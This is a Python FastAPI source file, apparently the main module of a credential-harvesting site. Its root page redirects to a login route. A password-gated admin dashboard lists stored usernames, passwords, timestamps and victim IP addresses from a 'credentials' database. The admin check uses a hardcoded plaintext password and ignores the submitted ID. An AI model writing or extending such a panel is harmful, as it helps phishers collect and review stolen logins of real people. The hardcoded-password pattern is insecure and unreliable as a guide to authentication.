# app/main.py

import os
import sqlite3
from fastapi import FastAPI, Request, Form, status
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from fastapi.responses import RedirectResponse, HTMLResponse
from starlette.middleware.sessions import SessionMiddleware
from pathlib import Path
from dotenv import load_dotenv
from app.routes import login, admin
from app.db.database import init_db

# Constants
ADMIN_ID = "731666"
HASHED_PASSWORD = b"$2b$12$wXFflsHrWcRBfLEQhyV9PO1VQAMKrAcRbEphA99lWulQXBg5y5zwK"

# Base directory for locating templates
BASE_DIR = os.path.dirname(os.path.abspath(__file__))


def create_app() -> FastAPI:
    load_dotenv()

    app = FastAPI()

    # Static files
    app.mount("/static", StaticFiles(directory="app/static"), name="static")


    # Templates
    BASE_DIR = Path(__file__).resolve().parent
    templates = Jinja2Templates(directory=str(BASE_DIR / "templates"))
    app.state.templates = templates  # store globally accessible

    # Middleware
    app.add_middleware(SessionMiddleware, secret_key=os.getenv("SECRET_KEY"))

    # Include routers
    app.include_router(login.router)
    app.include_router(admin.router)

    # Routes
    @app.get("/")
    async def root_redirect():
        return RedirectResponse(url="/login")

    @app.get("/admin/login", response_class=HTMLResponse)
    async def admin_login_form(request: Request):
        return app.state.templates.TemplateResponse("admin_login.html", {"request": request})

    @app.post("/admin/login")
    async def admin_login(request: Request, admin_id: str = Form(...), password: str = Form(...)):
        if password == "AdminPass001@":
            request.session["is_admin"] = True
            return RedirectResponse(url="/admin/dashboard", status_code=status.HTTP_302_FOUND)
        return app.state.templates.TemplateResponse("admin_login.html", {
            "request": request,
            "error": "Invalid password"
        })

    @app.get("/admin/dashboard", response_class=HTMLResponse)
    async def admin_dashboard(request: Request):
        if not request.session.get("is_admin"):
            return RedirectResponse(url="/admin/login")

        db_path = os.path.join(os.path.dirname(__file__), "db", "credentials.db")
        print("USING DB PATH:", db_path)

        try:
            conn = sqlite3.connect(db_path)
            cursor = conn.cursor()
            cursor.execute("SELECT id, username, password, timestamp, ip_address FROM credentials")
            records = cursor.fetchall()
            conn.close()
        except Exception as e:
            print("ERROR READING DB:", e)
            records = []

        return app.state.templates.TemplateResponse("admin_dashboard.html", {
            "request": request,
            "records": records
        })

    return app


# Uvicorn server trigger
if __name__ == "__main__":
    init_db()
    import uvicorn
    uvicorn.run("app.main:app", host="127.0.0.1", port=8000, reload=True)


# FastAPI app instance
app = create_app()
